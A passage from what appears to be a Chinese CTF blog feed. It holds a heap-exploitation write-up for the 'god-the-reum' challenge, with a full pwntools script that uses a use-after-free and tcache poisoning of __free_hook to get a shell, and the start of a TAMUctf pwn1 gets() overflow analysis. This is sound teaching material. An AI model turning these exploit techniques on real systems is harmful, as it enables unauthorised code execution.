  sleep(1u);
  printf("new eth : ");
  return __isoc99_scanf("%10s", *(_QWORD *)(a1 + 8)); //修改chunk
}
`
</code></pre>
<p>可以修改chunk</p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>存在uaf漏洞 所以要从这里入手</p>
<p>首先给定libc 2.27 存在了tcache所以leak方式需要改变</p>
<h4 id="1、how-to-leak"><a href="#1、how-to-leak" class="headerlink" title="1、how to leak"></a>1、how to leak</h4><p>首次执行double free后 打印会泄漏出heap地址</p>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python">create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#多加一个chunk可以防止top chunk回收</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#double free leak heap_base</span>
prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span>
</code></pre>
<h5 id="调式结果"><a href="#调式结果" class="headerlink" title="调式结果"></a>调式结果</h5><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">python exp.py

<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  how much you wanna withdraw? <span class="token keyword">:</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  withdraw ok <span class="token operator">!</span>

    <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> Ethereum wallet <span class="token function">service</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
    1. Create new wallet
    2. Deposit eth
    3. Withdraw eth
    4. Show all wallets
    5. <span class="token keyword">exit</span>
    <span class="token keyword">select</span> your choice <span class="token keyword">:</span>
0x564a72bee2f0
</code></pre>
<p>利用gdb查看当前heap地址</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> vmmap
LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA
    0x564a718e1000     0x564a718e3000 r-xp     2000 0      /home/ios/god-the-reum
    0x564a71ae2000     0x564a71ae3000 r--p     1000 1000   /home/ios/god-the-reum
    0x564a71ae3000     0x564a71ae4000 rw-p     1000 2000   /home/ios/god-the-reum
    0x564a72bee000     0x564a72c0f000 rw-p    21000 0      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
    0x7f92acc4d000     0x7f92ace34000 r-xp   1e7000 0      /lib/x86_64-linux-gnu/libc-2.27.so
    0x7f92ace34000     0x7f92ad034000 ---p   200000 1e7000 /lib/x86_64-linux-gnu/libc-2.27.so
</code></pre>
<p>因为leak了一次heap地址填充了1次tcache 所以再次填充6次即可填满tcache 之后free掉的chunk会进入unsorted bin 接着利用print_all 打印出当前bin的fd 即可leak main_arena从而得到libc_base</p>
<h3 id="这里需要掌握的知识"><a href="#这里需要掌握的知识" class="headerlink" title="这里需要掌握的知识"></a>这里需要掌握的知识</h3><h4 id="how-to-leak-libc"><a href="#how-to-leak-libc" class="headerlink" title="how to leak libc"></a>how to leak libc</h4><p>unsort bin是双向链表，如果只有一个chunk fd和bk都是main_arena+偏移。如果是多个就按照双向链表链起来（头和尾都是main_arena+偏移）</p>
<p>需要利用uaf+print配合</p>
<p>填充满tcache后查看当前heap</p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> heap
0x563b2fd6b000 PREV_INUSE <span class="token punctuation">{</span>
  mchunk_prev_size <span class="token operator">=</span> 0, 
  mchunk_size <span class="token operator">=</span> 593, 
  fd <span class="token operator">=</span> 0x0, 
  bk <span class="token operator">=</span> 0x700000000000000, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
0x563b2fd6b250 PREV_INUSE <span class="token punctuation">{</span>
  mchunk_prev_size <span class="token operator">=</span> 0, 
  mchunk_size <span class="token operator">=</span> 145, 
  fd <span class="token operator">=</span> 0x3461373737367830, 
  bk <span class="token operator">=</span> 0x3463613331616535, 
  fd_nextsize <span class="token operator">=</span> 0x3630333238336564, 
  bk_nextsize <span class="token operator">=</span> 0x3139613439306631
<span class="token punctuation">}</span>
0x563b2fd6b2e0 PREV_INUSE <span class="token punctuation">{</span>
  mchunk_prev_size <span class="token operator">=</span> 0, 
  mchunk_size <span class="token operator">=</span> 273, 
  fd <span class="token operator">=</span> 0x7ffab2fc9ca0 <span class="token operator">&lt;</span>main_arena+96<span class="token operator">></span>, 
  bk <span class="token operator">=</span> 0x7ffab2fc9ca0 <span class="token operator">&lt;</span>main_arena+96<span class="token operator">></span>, 
  fd_nextsize <span class="token operator">=</span> 0x0, 
  bk_nextsize <span class="token operator">=</span> 0x0
<span class="token punctuation">}</span>
</code></pre>
<p>可以看到该chunk fd bk都指向main_arena+96</p>
<p>可以利用 p main_arena查看当前main_arena_addr</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">d0 <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">1680</span><span class="token operator">></span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
  binmap <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">,</span> 
  next <span class="token operator">=</span> <span class="token number">0x7ffab2fc9c40</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">></span><span class="token punctuation">,</span> 
  next_free <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
  attached_threads <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> 
  system_mem <span class="token operator">=</span> <span class="token number">135168</span><span class="token punctuation">,</span> 
  max_system_mem <span class="token operator">=</span> <span class="token number">135168</span>
<span class="token punctuation">}</span>
</code></pre>
<p>可以得到main_arena</p>
<p>利用vmmap 查看当前加载libc基地址</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token number">0x563b2fd6b000</span>     <span class="token number">0x563b2fd8c000</span> rw<span class="token operator">-</span>p    <span class="token number">21000</span> <span class="token number">0</span>      <span class="token punctuation">[</span>heap<span class="token punctuation">]</span>
<span class="token number">0x7ffab2bde000</span>     <span class="token number">0x7ffab2dc5000</span> r<span class="token operator">-</span>xp   <span class="token number">1e7000</span> <span class="token number">0</span>      <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so
</code></pre>
<p>由于程序多次执行 导致地址发生变化==  此处计算offfset为同一进程 </p>
<p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> p/x 0x7ffab2fc9c40-0x7ffab2bde000
<span class="token variable">$2</span> <span class="token operator">=</span> 0x3ebc40
pwndbg<span class="token operator">></span>
</code></pre>
<p>0x7ffab2bde000 这个地址就是libc的实际加载地址，它和main_arena的偏移是固定的</p>
<p>加载地址会变但是这个偏移是不会变的，这样可以获取到远程的libc的加载地址</p>
<p>所以得到main_arena地址就可以计算libc_base了</p>
<h5 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h5><p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>heap_addr<span class="token punctuation">)</span>
prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">0x3ebc40</span>
libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>offset
</code></pre>
<p>这里减96时因为main_arena地址在这个位置</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token number">0x563b2fd6b2e0</span> PREV_INUSE <span class="token punctuation">{</span>
  mchunk_prev_size <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> 
  mchunk_size <span class="token operator">=</span> <span class="token number">273</span><span class="token punctuation">,</span> 
  fd <span class="token operator">=</span> <span class="token number">0x7ffab2fc9ca0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">,</span> 
  bk <span class="token operator">=</span> <span class="token number">0x7ffab2fc9ca0</span> <span class="token operator">&lt;</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token operator">></span><span class="token punctuation">,</span> 
  fd_nextsize <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">,</span> 
  bk_nextsize <span class="token operator">=</span> <span class="token number">0x0</span>
<span class="token punctuation">}</span>
</code></pre>
<p>因为offset = main_arena-libc_addr </p>
<p>所以libc_base = main_arena-offset</p>
<h5 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h5><p>这里有个不明白的地方，在使用one_gadget时查找libc-2.28.so会直接报错 所以这里使用的libc-2.27.so进行做题的～～</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c">ios@Sec<span class="token punctuation">:</span><span class="token operator">~</span>$ one_gadget <span class="token operator">/</span>lib<span class="token operator">/</span>x86_64<span class="token operator">-</span>linux<span class="token operator">-</span>gnu<span class="token operator">/</span>libc<span class="token number">-2.27</span><span class="token punctuation">.</span>so
<span class="token number">0x4f2c5</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token punctuation">:</span>
  rcx <span class="token operator">==</span> <span class="token constant">NULL</span>

<span class="token number">0x4f322</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token punctuation">:</span>
  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x40</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span>

<span class="token number">0x10a38c</span>    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span> rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">,</span> environ<span class="token punctuation">)</span>
constraints<span class="token punctuation">:</span>
  <span class="token punctuation">[</span>rsp<span class="token operator">+</span><span class="token number">0x70</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token constant">NULL</span>
ios@Sec<span class="token punctuation">:</span><span class="token operator">~</span>$
</code></pre>
<h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><p>有了libc base 就可以直接修改 tcache 中的 fd，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。创建一个不大于0x408的chunk，free掉后即可进入tcache，可以修改tcache的fd为free_hook的地址，进行两次分配后，即可分配到free_hook的地址，再次使用developer的隐藏功能直接把free_hook改成onegadget即可getshell</p>
<p>exp</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./god-the-reum'</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc-2.27.so'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'how much initial eth? :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input wallet no :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'how much you wanna withdraw? :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">prints</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">dev</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input wallet no :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'new eth :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>

create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>
create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1//防止合并</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#free 0 all</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#满足free条件后 double free </span>
prints<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak heap</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
<span class="token comment" spellcheck="true">#填满 tcache 7 上方以填入一次 所以这里填充6次即可</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
   delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>heap_addr<span class="token punctuation">)</span>
prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
offset <span class="token operator">=</span> <span class="token number">0x3ebc40</span>
libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>offset
<span class="token comment" spellcheck="true">#print hex(main_arena)</span>
gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x110</span><span class="token punctuation">)</span>
dev<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> 
create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span>
one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>
dev<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x110</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>4. Show all wallets
5. exit
select your choice :
[*]  input wallet no :
[*]  how much you wanna withdraw? :
[*] Switching to interactive mode
 $ ls
1.py Documents       exp.py         Music     pwntools
core Downloads       god-the-reum      Pictures  Templates
Desktop  examples.desktop  god-the-reum.nam  PublicVideos
$
</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;Tcache-struct&quot;&gt;&lt;a href=&quot;#Tcache-struct&quot; class=&quot;headerlink&quot; title=&quot;Tcache struct&quot;&gt;&lt;/a&gt;Tcache struct&lt;/h4&gt;&lt;p&gt;&lt;/p&gt;&lt;p class=&quot;code-caption
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>TAMUctf</title>
    <link href="http://iosmosis.github.io/2019/02/23/TAMUctf/"/>
    <id>http://iosmosis.github.io/2019/02/23/TAMUctf/</id>
    <published>2019-02-23T10:57:14.000Z</published>
    <updated>2019-03-10T04:36:10.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h3><p>查看ida</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1h] [ebp-3Bh]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-10h]</span>
  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+30h] [ebp-Ch]</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+34h] [ebp-8h]</span>

  v7 <span class="token operator">=</span> <span class="token operator">&amp;</span>argc<span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>dword_0 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v6 <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What... is your name?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"Sir Lancelot of Camelot\n"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I don't know that! Auuuuuuuugh!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What... is your quest?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> <span class="token string">"To seek the Holy Grail.\n"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I don't know that! Auuuuuuuugh!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What... is my secret?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//存在漏洞</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">==</span> <span class="token number">0xDEA110C8</span> <span class="token punctuation">)</span>
    <span class="token function">print_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">else</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I don't know that! Auuuuuuuugh!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>分析：程序流程很简单 需要回答两个问题 后达到漏洞点 存在溢出 需要满足 让v5=0xDEA110C8时 print flag</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1h] [ebp-3Bh]</span>
 <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+2Ch] [ebp-10h]</span>
</code></pre>
<p>s到v5的offset =0x3b-0x10=0x2b</p>
<p>所以可以构造exp 得到flag</p>
<p>####exp</p>
